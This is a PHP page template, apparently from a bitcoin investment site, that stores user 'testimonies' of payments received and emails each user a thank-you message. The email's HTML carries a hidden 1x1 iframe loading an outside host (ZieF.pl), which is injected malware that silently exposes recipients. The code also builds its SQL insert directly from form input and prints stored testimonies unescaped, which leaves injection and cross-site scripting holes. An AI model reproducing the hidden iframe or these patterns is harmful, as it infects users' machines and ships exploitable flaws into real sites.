<div class="content">
				<div class="container-fluid">
				<div class="row"> 
				<div class="col-lg-12 col-md-12 col-sm-12">
				<?php  if(isset($_POST["update"])){
$test=$_POST["test"]; $date=date('d M , Y');
$sql="INSERT INTO testimony(username,name,date,misc) VALUES('$client','$test','$date','thanks')";
if($conn->query($sql)==TRUE){
     $subject = 'Thank you';
$to = $em;
$from = '@radicalbitcoin';
// To send HTML mail, the Content-type header must be set

    $headers  = 'MIME-Version: 1.0' . "\r\n";

    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
// Create email headers

    $headers .= 'From: '.$from."\r\n".

        'Reply-To: '.$from."\r\n" .

        'X-Mailer: PHP/' . phpversion();
 
    $message .= '<html>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body></table><TD height="2" style="LINE-HEIGHT: 2.5;
	MARGIN: 0px; FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif;
	MAX-WIDTH: 600px; COLOR: black; FONT-SIZE: 15px">Nice Deed '.$client.', <br> Thanks for
	submitting a testimony of payment recieved in our website. please do well to share the
	news. Welcome</TD></TR>
	</TBODY></TABLE></P></BODY></HTML>';

    // Sending email

    if(mail($to, $subject, $message, $headers)){

        echo '<center><h4 style="color:black;"></h4><br></center>' ;

    } else{
echo 'Email sent';
}
    echo "<div class='alert alert-success'>TESTIMONY SUCCESSFULLY UPLOADED</div>";
	} }
?> 
<div class="card card-stats">
								<div class="panel-footer back-footer-blue" style="background:#069;">
                                <h4> <i class="fa fa-thumbs-up"></i> Testimonies</h4>

                            </div>
				 <div class="panel panel-primary text-center no-boder bg-color-blue">
				 
                            <div class="panel-body">
                                <div class='alert alert-warning' >Please also include transaction id of confirmation email sent to you of the payment you recieved in your wallet</div>
										<br>
										<form method='post'>
										<div class="col-md-12">
                                                                                    <div class="col-md-12">
                                            <div class="form-group">
                                                
                                                <textarea type="text" class="form-control border-input"  placeholder="testimony" name="test" ></textarea>
                                            </div>
                                        </div>
                                        
                                        
										<div class="text-center">
                                    <button type="submit" name="update" class="btn btn-info btn-fill btn-wd"><i class='fa fa-check'></i> Testify</button>
                                </div>
                                
                                    <div class="clearfix"></div>
                                    <br><hr>
										</form>
										<?php

$query="SELECT * FROM testimony ";
$result=$conn->query($query);
if($result->num_rows>0) {
while ($row=$result->fetch_assoc()) {
$se1= $row["username"]; 
 $se2= $row["name"];
 echo "<div class='col-md-12'><div class='alert alert-success'>$se2
 <br>
  by:$se1
  </div></div>";
}} else
{}
						
?>
									</div></div></div></div></div></div></div></div>
								
	
							